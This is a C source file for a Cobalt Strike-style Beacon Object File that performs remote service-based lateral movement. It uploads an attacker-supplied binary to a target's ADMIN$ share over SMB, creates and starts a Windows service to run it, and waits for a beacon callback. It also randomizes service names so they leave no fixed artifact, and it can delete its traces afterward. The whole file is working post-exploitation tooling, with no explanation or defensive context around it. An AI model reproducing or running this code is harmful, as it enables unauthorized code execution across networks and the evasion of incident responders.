#include <windows.h>
#include <stdio.h>
#include "beacon.h"

WINBASEAPI int __cdecl MSVCRT$_snprintf(char * __restrict__ d, size_t n, const char * __restrict__ format, ...);
WINBASEAPI int __cdecl MSVCRT$strcmp(const char *s1, const char *s2);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped );
WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA( LPCSTR lpFileName );
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR lpMachineName,LPCSTR lpDatabaseName,DWORD dwDesiredAccess);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$CreateServiceA(SC_HANDLE hSCManager,LPCSTR lpServiceName,LPCSTR lpDisplayName,DWORD dwDesiredAccess,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCSTR lpBinaryPathName,LPCSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCSTR lpDependencies,LPCSTR lpServiceStartName,LPCSTR lpPassword);
WINADVAPI WINBOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE hSCObject);
WINADVAPI WINBOOL WINAPI ADVAPI32$ControlService(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
WINADVAPI WINBOOL WINAPI ADVAPI32$DeleteService(SC_HANDLE hService);
WINADVAPI WINBOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCSTR *lpServiceArgVectors);
WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(VOID);

/* Randomize the fallback service name per run (GetTickCount-derived) so an
 * operator-supplied name is not a fixed artifact. Wrapper "-n random" already
 * randomizes; this only fires when no name is passed at all. */
void RandomServiceName(char *out, size_t cap)
{
    DWORD t = KERNEL32$GetTickCount();
    MSVCRT$_snprintf(out, cap, "SvcHost%lu%c%c", (unsigned long)(t % 89999) + 10000,
                     "abcdefghjkmnpqrstuvwxyz"[(t >> 5) % 23],
                     "abcdefghjkmnpqrstuvwxyz"[(t >> 11) % 23]);
}

void go(char *args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);

    ULONG tmp = 0;
    ULONG svcBinarySize = 0;
    CHAR* target      = BeaconDataExtract(&parser, NULL);
    CHAR* svcBinary   = BeaconDataExtract(&parser, &svcBinarySize);
    CHAR* binaryName  = BeaconDataExtract(&parser, &tmp);
    CHAR* share       = BeaconDataExtract(&parser, &tmp);
    CHAR* servicePath = BeaconDataExtract(&parser, &tmp);
    CHAR* serviceName = BeaconDataExtract(&parser, &tmp);
    CHAR* displayName = BeaconDataExtract(&parser, &tmp);
    int   doCleanup   = BeaconDataInt(&parser);

    // handle empty parameters with defaults
    if (!binaryName || binaryName[0] == '\0')    binaryName = "service.exe";
    if (!share || share[0] == '\0')              share = "ADMIN$";
    if (!servicePath || servicePath[0] == '\0')  servicePath = "\\\\%SYSTEMROOT%";
    // no name passed (or the old hardcoded default) -> randomize per run so the
    // service name is never a fixed artifact. Wrapper "-n random" randomizes
    // client-side; this is the fallback for direct BOF calls.
    static char randName[MAX_PATH];
    if (!serviceName || serviceName[0] == '\0' || 0 == MSVCRT$strcmp(serviceName, "WindowsUpdateService")) {
        RandomServiceName(randName, MAX_PATH);
        serviceName = randName;
        if (!displayName || displayName[0] == '\0')
            displayName = randName;
    }
    if (!displayName || displayName[0] == '\0')  displayName = serviceName;

    CHAR remotePath[MAX_PATH];
    MSVCRT$_snprintf(remotePath, sizeof(remotePath), "\\\\%s\\%s\\%s", target, share, binaryName);
    BeaconPrintf(CALLBACK_OUTPUT, "Uploading binary to %s", remotePath);

    HANDLE hFile = KERNEL32$CreateFileA(remotePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "Failed to create remote file: %lu", err);
        if (err == 5)
            BeaconPrintf(CALLBACK_ERROR, "Access denied - check credentials and share permissions");
        return;
    }

    DWORD bytesWritten;
    if (!KERNEL32$WriteFile(hFile, svcBinary, svcBinarySize, &bytesWritten, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write file: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hFile);
        KERNEL32$DeleteFileA(remotePath);
        return;
    }
    if (bytesWritten != svcBinarySize) {
        BeaconPrintf(CALLBACK_ERROR, "Incomplete write: %lu of %lu bytes", bytesWritten, svcBinarySize);
        KERNEL32$CloseHandle(hFile);
        KERNEL32$DeleteFileA(remotePath);
        return;
    }
    KERNEL32$CloseHandle(hFile);
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully uploaded %lu bytes", bytesWritten);

    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerA(target, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "Failed to open SCM: %lu", err);
        if (err == 5)
            BeaconPrintf(CALLBACK_ERROR, "Access denied - need Administrator privileges on target");
        KERNEL32$DeleteFileA(remotePath);
        return;
    }

    KERNEL32$Sleep(500);

    char payloadPath[MAX_PATH];
    MSVCRT$_snprintf(payloadPath, sizeof(payloadPath), "%s\\%s", servicePath, binaryName);
    BeaconPrintf(CALLBACK_OUTPUT, "Creating service '%s' with path '%s'", serviceName, payloadPath);

    SC_HANDLE hSvc = ADVAPI32$CreateServiceA( hSCM, serviceName, displayName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payloadPath, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "Failed to create service: %lu", err);
        if (err == 1073)
            BeaconPrintf(CALLBACK_ERROR, "Service already exists (error 1073) - use SCExec BOF");
        else if (err == 1072)
            BeaconPrintf(CALLBACK_ERROR, "Service marked for deletion (error 1072) - wait and retry");
        ADVAPI32$CloseServiceHandle(hSCM);
        KERNEL32$DeleteFileA(remotePath);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Service created successfully");

    KERNEL32$Sleep(500);


    if (!ADVAPI32$StartServiceA(hSvc, 0, NULL)) {
        DWORD err = KERNEL32$GetLastError();
        if (err == 1053) {
            BeaconPrintf(CALLBACK_OUTPUT, "Service start timeout (error 1053) - service may have started successfully. Check for beacon callback!");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to start service: %lu", err);
            if (err == 1058)
                BeaconPrintf(CALLBACK_ERROR, "Service disabled - cannot start");
            else if (err == 1069)
                BeaconPrintf(CALLBACK_ERROR, "Service logon failure - check service account");
        }
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Service '%s' started successfully", serviceName);

    if (doCleanup) {
        // cleanup phase - stop and delete service, then delete file.
        // WARNING: if the injected payload is still running inside the service
        // process this kills the new session, so the wrapper defaults to 0
        // and cleanup is an explicit operator choice (delete artifacts now).
        BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up service and file...");
        KERNEL32$Sleep(2000);

        SERVICE_STATUS status;
        if (ADVAPI32$ControlService(hSvc, SERVICE_CONTROL_STOP, &status)) {
            KERNEL32$Sleep(500);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Service not running (already exited) - skipping stop");
        }

        if (ADVAPI32$DeleteService(hSvc)) {
            BeaconPrintf(CALLBACK_OUTPUT, "Service deleted");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "DeleteService failed: %lu", KERNEL32$GetLastError());
        }

        ADVAPI32$CloseServiceHandle(hSvc);
        ADVAPI32$CloseServiceHandle(hSCM);

        KERNEL32$Sleep(500);
        if (KERNEL32$DeleteFileA(remotePath)) {
            BeaconPrintf(CALLBACK_OUTPUT, "Binary file deleted");
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Execution complete");
        return;
    }

    // leave the service installed: close handles only. Operator re-runs with
    // cleanup=1 (or sc delete) when artifacts should be removed.
    ADVAPI32$CloseServiceHandle(hSvc);
    ADVAPI32$CloseServiceHandle(hSCM);
}